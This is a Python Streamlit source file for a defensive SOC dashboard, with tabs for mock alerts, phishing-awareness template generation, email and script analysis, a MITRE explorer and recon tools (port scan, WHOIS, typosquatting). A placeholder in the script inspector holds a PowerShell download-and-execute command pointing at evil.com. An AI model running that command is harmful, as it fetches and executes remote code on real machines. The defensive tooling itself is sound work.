import streamlit as st
import os
import pandas as pd
import numpy as np
import plotly.express as px
import plotly.graph_objects as go
from datetime import datetime

# Import local components
from components.ui import inject_custom_css, metric_card, brand_header, get_plotly_layout
from components.recon import run_port_scan, get_whois_info, get_dns_records, generate_typosquatting_domains
from components.mitre_intel import render_mitre_explorer
from components.phishing_sim import generate_phishing_template, analyze_phishing_ai
from components.malware_scan import scan_file_signature, scan_file_heuristics, analyze_script_code
from components.chatbot import render_soc_chatbot

# Page config
st.set_page_config(
    page_title="SOC Anti-Phishing & Blue Team Console",
    page_icon="🛡️",
    layout="wide",
    initial_sidebar_state="expanded"
)

# Initialize global states
if "theme" not in st.session_state:
    st.session_state.theme = "dark"

if "alerts_log" not in st.session_state:
    st.session_state.alerts_log = [
        {"timestamp": "2026-07-03 10:14:02", "source": "192.168.1.105", "event": "Spearphishing Email Blocked", "tactic": "Initial Access (T1566)", "severity": "High"},
        {"timestamp": "2026-07-03 09:44:15", "source": "192.168.1.18", "event": "PowerShell iex Downloader blocked", "tactic": "Execution (T1059)", "severity": "Critical"},
        {"timestamp": "2026-07-03 08:12:00", "source": "10.0.0.4", "event": "Unrecognized DNS MX query", "tactic": "Reconnaissance (T1590)", "severity": "Low"},
        {"timestamp": "2026-07-02 23:30:19", "source": "192.168.1.112", "event": "EICAR Test File Detected", "tactic": "Defense Evasion (T1027)", "severity": "Informational"},
        {"timestamp": "2026-07-02 18:05:44", "source": "192.168.1.5", "event": "Failed schtasks Persistence Registry write", "tactic": "Persistence (T1053)", "severity": "Medium"}
    ]

# Theme toggler helper
def toggle_theme():
    st.session_state.theme = "light" if st.session_state.theme == "dark" else "dark"

IS_DARK = st.session_state.theme == "dark"

# Inject CSS styles
inject_custom_css(IS_DARK)

# Sidebar controls
with st.sidebar:
    st.markdown("""
    <div style="text-align: center; padding-bottom: 1.5rem; border-bottom: 1px solid var(--border);">
        <h2 style="margin: 0; font-size: 1.25rem; font-weight: 800;">🛡️ SEC OPS CONTROL</h2>
        <p style="margin: 5px 0 0 0; font-size: 0.72rem; color: var(--text-dim);">V1.0.0 | Active Node</p>
    </div>
    """, unsafe_allow_html=True)
    
    st.write("")
    
    # API key setup
    st.markdown("### 🔑 CREDENTIALS")
    api_key_env = os.environ.get("GEMINI_API_KEY", "")
    if not api_key_env:
        try:
            api_key_env = st.secrets.get("GEMINI_API_KEY", "")
        except Exception:
            pass
    api_key_input = st.text_input(
        "Gemini API Key",
        value=api_key_env if api_key_env else st.session_state.get("gemini_key", ""),
        type="password",
        help="Provide your Gemini API key to enable AI-powered phishing generation, code scanning, and SOC chatbots."
    )
    st.session_state.gemini_key = api_key_input
    
    st.write("")
    st.markdown("### 📊 THREAT TELEMETRY")
    simulation_speed = st.slider("Simulation Tick Rate", 1, 10, 5, help="Simulation event updates per minute.")
    auto_quarantine = st.toggle("Auto-Quarantine Threats", True, help="Automatically isolate identified malicious file hashes.")
    
    st.write("")
    st.write("")
    st.markdown(
        f"""
        <div style="border: 1px solid var(--border); border-radius: 8px; padding: 0.75rem; background: var(--bg-subtle);">
            <div style="font-size: 0.72rem; font-weight: 600; color: var(--text-muted);">CONSOLE STATUS</div>
            <div style="display: flex; align-items: center; gap: 6px; margin-top: 0.35rem;">
                <span style="width: 8px; height: 8px; border-radius: 50%; background: #22c55e; display: inline-block;"></span>
                <span style="font-size: 0.78rem; font-weight: 600; color: var(--text);">ACTIVE</span>
            </div>
            <div style="font-size: 0.7rem; color: var(--text-muted); margin-top: 0.5rem;">
                Mode: {'AI Enabled' if api_key_input else 'Heuristics Only'}<br>
                Host Node: LOCAL-AGENT<br>
                Engine Time: {datetime.now().strftime('%H:%M:%S')}
            </div>
        </div>
        """,
        unsafe_allow_html=True
    )

# Render main logo and branding header
brand_header("ANTIGRAVITY BLUE TEAMING CONSOLE", IS_DARK, toggle_theme)

# Tab navigation
tabs = st.tabs([
    "🛡️ Threat Dashboard",
    "🎣 Phishing Simulator",
    "🔬 Mini Antivirus",
    "📖 MITRE ATT&CK Explorer",
    "📡 Reconnaissance Hub",
    "💬 Gemini SOC Chatbot"
])

# ==========================================
# TAB 1: THREAT DASHBOARD
# ==========================================
with tabs[0]:
    # Metrics Row
    c1, c2, c3, c4 = st.columns(4)
    with c1:
        metric_card("Simulations Deployed", "148", delta="12%", delta_type="up")
    with c2:
        metric_card("Phishing Emails Quarantined", "1,245", delta="24 new", delta_type="warn")
    with c3:
        metric_card("Malicious Hashes Blocked", "42", delta="2 today", delta_type="up")
    with c4:
        metric_card("Active Alerts", str(len(st.session_state.alerts_log)), delta="-3 hrs ago", delta_type="down")
        
    st.write("")
    
    # Dash layout
    dash_col1, dash_col2 = st.columns([6, 4])
    
    with dash_col1:
        st.markdown("""
        <div class="chart-wrap">
            <div class="chart-title">Alert Severities & Ingestion Volumes</div>
            <div class="chart-subtitle">Telemetry trends of blocked vectors (past 7 days)</div>
        </div>
        """, unsafe_allow_html=True)
        
        # Generate chart data
        chart_df = pd.DataFrame({
            "Day": ["Mon", "Tue", "Wed", "Thu", "Fri", "Sat", "Sun"],
            "Phishing": [25, 42, 19, 56, 38, 12, 8],
            "Malware Hashes": [5, 8, 4, 12, 6, 2, 1],
            "Suspicious Execution": [8, 12, 7, 18, 9, 3, 2]
        })
        
        fig = px.line(chart_df, x="Day", y=["Phishing", "Malware Hashes", "Suspicious Execution"],
                      color_discrete_sequence=["#2563eb", "#ef4444", "#f59e0b"])
        fig.update_layout(get_plotly_layout(IS_DARK))
        st.plotly_chart(fig, use_container_width=True, config={"displayModeBar": False})
        
    with dash_col2:
        st.markdown("""
        <div class="chart-wrap" style="height: 100%;">
            <div class="chart-title">Active Security Event Log</div>
            <div class="chart-subtitle">Real-time alerts log of localized indicators</div>
        </div>
        """, unsafe_allow_html=True)
        
        # Build HTML table for alert log
        rows = ""
        for alert in st.session_state.alerts_log:
            badge_class = "badge-red" if alert["severity"] == "Critical" else (
                "badge-amber" if alert["severity"] == "High" else (
                    "badge-blue" if alert["severity"] == "Medium" else "badge-green"
                )
            )
            rows += f"""
            <tr>
                <td style="font-size:0.75rem; color: #71717a;">{alert['timestamp'].split(' ')[1]}</td>
                <td><strong>{alert['event']}</strong></td>
                <td><span class="badge {badge_class}">{alert['severity']}</span></td>
                <td><code>{alert['source']}</code></td>
            </tr>
            """
            
        st.markdown(f"""
        <table class="data-table">
            <thead>
                <tr>
                    <th>Time</th>
                    <th>Alert / Threat Description</th>
                    <th>Severity</th>
                    <th>Source Node</th>
                </tr>
            </thead>
            <tbody>
                {rows}
            </tbody>
        </table>
        """, unsafe_allow_html=True)
        
    st.write("")
    
    # Cyber Kill Chain Flowchart Overview
    st.markdown("""
    <div class="chart-wrap">
        <div class="chart-title">Lockheed Martin Cyber Kill Chain Timeline</div>
        <div class="chart-subtitle">Standardized attack lifecycle stages and matching local mitigations</div>
    </div>
    """, unsafe_allow_html=True)
    
    kc_cols = st.columns(7)
    kc_phases = [
        {"name": "1. Recon", "desc": "Information gathering (WHOIS, DNS query)", "status": "Clean", "color": "green"},
        {"name": "2. Weaponize", "desc": "Setup phishing domain, build exploit", "status": "1 Flagged", "color": "amber"},
        {"name": "3. Delivery", "desc": "Transmission of phishing emails / links", "status": "Blocked", "color": "red"},
        {"name": "4. Exploit", "desc": "User executes macro / script payload", "status": "Prevented", "color": "green"},
        {"name": "5. Install", "desc": "Setting up persistence / backdoors", "status": "Clean", "color": "green"},
        {"name": "6. C2 Connect", "desc": "Opening remote shells back to server", "status": "Clean", "color": "green"},
        {"name": "7. Objectives", "desc": "Data exfiltration or ransomware block", "status": "Clean", "color": "green"}
    ]
    
    for i, phase in enumerate(kc_phases):
        badge_style = "badge-green" if phase["color"] == "green" else ("badge-amber" if phase["color"] == "amber" else "badge-red")
        with kc_cols[i]:
            st.markdown(f"""
            <div style="border: 1px solid var(--border); border-radius: 8px; padding: 0.85rem; background: var(--bg-subtle); text-align: center; min-height: 160px; height: 100%;">
                <div style="font-weight: 700; font-size: 0.85rem; color: var(--accent); margin-bottom: 0.35rem;">{phase['name']}</div>
                <div style="font-size: 0.72rem; color: var(--text-muted); min-height: 55px; margin-bottom: 0.5rem;">{phase['desc']}</div>
                <span class="badge {badge_style}" style="font-size: 0.65rem;">{phase['status']}</span>
            </div>
            """, unsafe_allow_html=True)

# ==========================================
# TAB 2: PHISHING SIMULATOR
# ==========================================
with tabs[1]:
    ps_col1, ps_col2 = st.columns([5, 5])
    
    with ps_col1:
        st.markdown("""
        <div style="margin-bottom: 1rem;">
            <h3 style="margin: 0; font-size: 1.15rem;">🎣 AI Phishing Template Generator</h3>
            <p style="margin: 0; font-size: 0.75rem; color: var(--text-dim);">Generate simulated phishing scenarios to train corporate users and measure reporting rates.</p>
        </div>
        """, unsafe_allow_html=True)
        
        sim_dept = st.selectbox("Target Department", ["IT", "HR", "Finance", "Operations", "Sales"])
        sim_diff = st.select_slider("Simulation Difficulty", ["easy", "medium", "hard"])
        sim_scenario = st.selectbox("Pretext Scenario", [
            "Credential Harvesting Login",
            "Urgent System Upgrade Required",
            "Payroll Correction Request",
            "Security Audit Check",
            "Package Delivery Failure Notification"
        ])
        
        if st.button("🚀 Generate Campaign Template", use_container_width=True):
            with st.spinner("Generating training campaign content..."):
                template = generate_phishing_template(sim_dept, sim_diff, sim_scenario, st.session_state.gemini_key)
                st.session_state.generated_template = template
                
        if "generated_template" in st.session_state:
            tmpl = st.session_state.generated_template
            st.markdown("#### Generated Email Content")
            st.markdown(f"**Subject:** `{tmpl.get('subject', 'Untitled')}`")
            st.code(tmpl.get("body", ""), language="text")
            
            st.markdown("#### Educational Metadata")
            st.markdown(f"**MITRE ATT&CK Alignment:** `{tmpl.get('mitre', 'T1566')}`")
            st.markdown(f"**Psychological Triggers:** `{tmpl.get('triggers', 'N/A')}`")
            
            st.info("**What analysts should spot:**\n" + "\n".join([f"- {ind}" for ind in tmpl.get("indicators", [])]))
            
    with ps_col2:
        st.markdown("""
        <div style="margin-bottom: 1rem;">
            <h3 style="margin: 0; font-size: 1.15rem;">🔍 AI Email Threat Analyzer</h3>
            <p style="margin: 0; font-size: 0.75rem; color: var(--text-dim);">Paste suspicious email headers and message bodies to evaluate phishing risk.</p>
        </div>
        """, unsafe_allow_html=True)
        
        email_content = st.text_area(
            "Paste suspicious email text / headers",
            height=230,
            placeholder="From: security@paypal-verify-team.com\nTo: victims@domain.com\nSubject: Security ALERT: Account suspended!\n\nDear customer, we detected unusual activities on your credit card. Login within 2 hours to avoid penalty: http://192.168.4.11/login..."
        )
        
        if st.button("🕵️ Run Email Threat Analysis", use_container_width=True):
            if not email_content.strip():
                st.error("Please enter email content to analyze.")
            else:
                with st.spinner("Decoding threat signatures..."):
                    res = analyze_phishing_ai(email_content, st.session_state.gemini_key)
                    
                    st.markdown(f"### Threat Score: **{res['score']}/100**")
                    st.markdown(f"Verdict: <span class='badge {res['badge']}'>{res['rating']}</span>", unsafe_allow_html=True)
                    st.markdown(f"**MITRE Technique:** `{res['mitre']}`")
                    
                    st.write("")
                    st.markdown("**Phishing Flags Detected:**")
                    for indicator in res["indicators"]:
                        st.markdown(f"- ❌ {indicator}")
                        
                    st.write("")
                    st.markdown("**Analyst Assessment Details:**")
                    st.write(res["detailed_analysis"])
                    
                    # Log to active alerts if high risk
                    if res["score"] >= 60:
                        st.session_state.alerts_log.insert(0, {
                            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                            "source": "EMAIL-INBOUND",
                            "event": "Analyst Phishing File Upload Flagged",
                            "tactic": res["mitre"],
                            "severity": "High" if res["score"] < 85 else "Critical"
                        })

# ==========================================
# TAB 3: MINI ANTIVIRUS
# ==========================================
with tabs[2]:
    st.markdown("""
    <div style="margin-bottom: 1.5rem;">
        <h3 style="margin: 0; font-size: 1.25rem;">🔬 Mini Antivirus & Code Inspector</h3>
        <p style="margin: 0; font-size: 0.8rem; color: var(--text-dim);">Scan local assets against threat signatures, evaluate string heuristics, or request AI script verification.</p>
    </div>
    """, unsafe_allow_html=True)
    
    sub_col1, sub_col2 = st.columns(2)
    
    with sub_col1:
        st.markdown("#### 📁 File Signature & Heuristic Scanner")
        uploaded_file = st.file_uploader("Upload suspicious file to scan (scripts, configurations, logs, etc.)", type=None)
        
        if uploaded_file is not None:
            file_bytes = uploaded_file.read()
            # Signature scan
            sig_res = scan_file_signature(file_bytes)
            
            st.markdown(f"**MD5:** `{sig_res['md5']}`")
            st.markdown(f"**SHA-256:** `{sig_res['sha256']}`")
            
            if sig_res["is_malicious"]:
                info = sig_res["signature_info"]
                st.markdown(f"""
                <div style="background: rgba(239,68,68,0.15); border: 1px solid var(--red); padding: 1rem; border-radius: var(--radius); margin-top: 1rem; margin-bottom: 1rem;">
                    <div style="color: var(--red); font-weight: 700; font-size: 1.1rem; display: flex; align-items: center; gap: 8px;">
                        🚨 SIGNATURE MATCH: {info['name']}
                    </div>
                    <div style="font-size: 0.8rem; margin-top: 0.5rem; line-height: 1.45; color: var(--text);">
                        <strong>Type:</strong> {info['type']}<br>
                        <strong>Severity:</strong> {info['severity']}<br>
                        <strong>Details:</strong> {info['description']}
                    </div>
                </div>
                """, unsafe_allow_html=True)
                
                # Auto Quarantine log
                if auto_quarantine:
                    st.toast(f"Isolated {uploaded_file.name} to Quarantine Vault.", icon="🛡️")
            else:
                st.success("✅ File hash does not match any known threat signatures in database.")
                
                # Check text content for heuristics
                try:
                    file_text = file_bytes.decode("utf-8", errors="ignore")
                    heu_res = scan_file_heuristics(file_text)
                    
                    if heu_res:
                        st.markdown("##### 🔍 Static Heuristic Findings (YARA Mode)")
                        for find in heu_res:
                            sev_badge = "badge-red" if find["severity"] == "Critical" else ("badge-amber" if find["severity"] == "High" else "badge-blue")
                            st.markdown(f"""
                            <div style="background: var(--bg-subtle); border-left: 3px solid var(--accent); padding: 0.6rem; border-radius: 4px; margin-bottom: 0.5rem;">
                                <div style="display: flex; justify-content: space-between;">
                                    <span style="font-weight: 600; font-size:0.85rem;">Rule: {find['rule']}</span>
                                    <span class="badge {sev_badge}">{find['severity']}</span>
                                </div>
                                <div style="font-size:0.75rem; color: var(--text-muted); margin-top: 0.25rem;">{find['description']}</div>
                                <div style="font-size:0.7rem; font-family: monospace; color: var(--text-dim); margin-top: 0.25rem;">Matches: {', '.join(find['matches'])}</div>
                            </div>
                            """, unsafe_allow_html=True)
                    else:
                        st.info("No suspicious API strings or PowerShell execution flags detected in file text.")
                except Exception as e:
                    st.warning(f"Could not read file text for heuristics: {e}")
                    
    with sub_col2:
        st.markdown("#### 📜 AI Script Inspector")
        script_code = st.text_area(
            "Paste suspicious script to analyze (PowerShell, VBA, Bash, Python, etc.)",
            height=200,
            placeholder="powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')\""
        )
        
        if st.button("🔬 Analyze Script Behavior", use_container_width=True):
            if not script_code.strip():
                st.error("Please enter code/script to analyze.")
            else:
                with st.spinner("De-obfuscating script syntax..."):
                    code_res = analyze_script_code(script_code, st.session_state.gemini_key)
                    
                    st.markdown(f"### Safety Verdict: <span class='badge {code_res['badge']}'>{code_res['verdict']}</span>", unsafe_allow_html=True)
                    st.markdown(f"**MITRE Mapping:** `{code_res['mitre']}`")
                    st.markdown(f"**Summary:** {code_res['summary']}")
                    
                    st.markdown("##### Detected Behaviors")
                    for behavior in code_res["behaviors"]:
                        st.markdown(f"- ⚠️ {behavior}")
                        
                    st.write("")
                    st.markdown("##### Code Deconstruction & Workflow")
                    st.write(code_res["detailed_analysis"])

# ==========================================
# TAB 4: MITRE ATT&CK EXPLORER
# ==========================================
with tabs[3]:
    render_mitre_explorer(IS_DARK)

# ==========================================
# TAB 5: RECONNAISSANCE HUB
# ==========================================
with tabs[4]:
    st.markdown("""
    <div style="margin-bottom: 1.5rem;">
        <h3 style="margin: 0; font-size: 1.25rem;">📡 Active & Passive Reconnaissance Hub</h3>
        <p style="margin: 0; font-size: 0.8rem; color: var(--text-dim);">Audit infrastructure configurations, perform port scans, query WHOIS, or check typosquatting vectors.</p>
    </div>
    """, unsafe_allow_html=True)
    
    recon_col1, recon_col2 = st.columns(2)
    
    with recon_col1:
        st.markdown("#### 🔍 Active Scanning (DNS & Ports)")
        recon_target = st.text_input("Target Domain or IP Address", "8.8.8.8", placeholder="e.g. example.com or 192.168.1.1")
        
        recon_action = st.radio("Choose Action", ["DNS Records Lookup", "Fast Port Scan"], horizontal=True)
        
        if st.button("Execute Active Recon", use_container_width=True):
            if not recon_target.strip():
                st.error("Please provide a target.")
            else:
                if recon_action == "DNS Records Lookup":
                    with st.spinner("Querying DNS servers..."):
                        dns_res = get_dns_records(recon_target)
                        st.markdown(f"##### DNS Records for `{recon_target}`")
                        
                        st.write("**A Records (IPs):**")
                        for a in dns_res["A"]: st.code(a)
                        st.write("**MX Records (Mail Servers):**")
                        for mx in dns_res["MX"]: st.code(mx)
                        st.write("**TXT Records (Verification/SPF):**")
                        for txt in dns_res["TXT"]: st.code(txt)
                else:
                    # Port Scan
                    progress_bar = st.progress(0.0)
                    status_text = st.empty()
                    
                    open_ports = run_port_scan(recon_target, progress_bar, status_text)
                    
                    if open_ports and "Error" in open_ports[0]["status"]:
                        st.error(open_ports[0]["status"])
                    elif not open_ports:
                        st.warning("Scan complete. All scanned ports are closed/filtered.")
                    else:
                        st.markdown(f"##### Open Ports on `{recon_target}`")
                        rows = ""
                        for p in open_ports:
                            rows += f"""
                            <tr>
                                <td><code>{p['port']}</code></td>
                                <td>{p['service']}</td>
                                <td><span class="badge badge-green">OPEN</span></td>
                            </tr>
                            """
                        st.markdown(f"""
                        <table class="data-table">
                            <thead>
                                <tr>
                                    <th>Port</th>
                                    <th>Service</th>
                                    <th>Status</th>
                                </tr>
                            </thead>
                            <tbody>
                                {rows}
                            </tbody>
                        </table>
                        """, unsafe_allow_html=True)
                        
    with recon_col2:
        st.markdown("#### 🌐 Passive Footprinting & Phishing Defense")
        passive_target = st.text_input("Domain to Audit", "google.com", placeholder="e.g. testdomain.com")
        
        passive_action = st.radio("Choose passive audit action", ["WHOIS Registry Query", "Typosquatting Generator"], horizontal=True)
        
        if st.button("Execute Passive Audit", use_container_width=True):
            if not passive_target.strip():
                st.error("Please specify a target domain.")
            else:
                if passive_action == "WHOIS Registry Query":
                    with st.spinner("Connecting to registry port 43..."):
                        whois_data = get_whois_info(passive_target)
                        st.markdown(f"##### WHOIS Record for `{passive_target}`")
                        st.text_area("Raw WHOIS registry response", whois_data, height=350)
                else:
                    # Typosquatting
                    with st.spinner("Generating lookalike patterns..."):
                        typo_domains = generate_typosquatting_domains(passive_target)
                        
                        if not typo_domains:
                            st.warning("Please enter a valid domain format (e.g. name.com)")
                        else:
                            st.markdown(f"##### TypoSquatting / Homoglyph Audit for `{passive_target}`")
                            st.markdown("<p style='font-size:0.75rem; color: var(--text-muted);'>Common domain modifications that adversaries register to execute phishing spear-links.</p>", unsafe_allow_html=True)
                            
                            t_rows = ""
                            for item in typo_domains:
                                risk_badge = "badge-red" if item["severity"] == "High Risk" else ("badge-amber" if item["severity"] == "Medium Risk" else "badge-green")
                                t_rows += f"""
                                <tr>
                                    <td><strong>{item['domain']}</strong></td>
                                    <td>{item['type']}</td>
                                    <td><span class="badge {risk_badge}">{item['status']}</span></td>
                                </tr>
                                """
                            st.markdown(f"""
                            <table class="data-table">
                                <thead>
                                    <tr>
                                        <th>Lookalike Domain</th>
                                        <th>Modification Type</th>
                                        <th>Resolution Status</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    {t_rows}
                                </tbody>
                            </table>
                            """, unsafe_allow_html=True)

# ==========================================
# TAB 6: GEMINI SOC CHATBOT
# ==========================================
with tabs[5]:
    render_soc_chatbot(st.session_state.gemini_key)
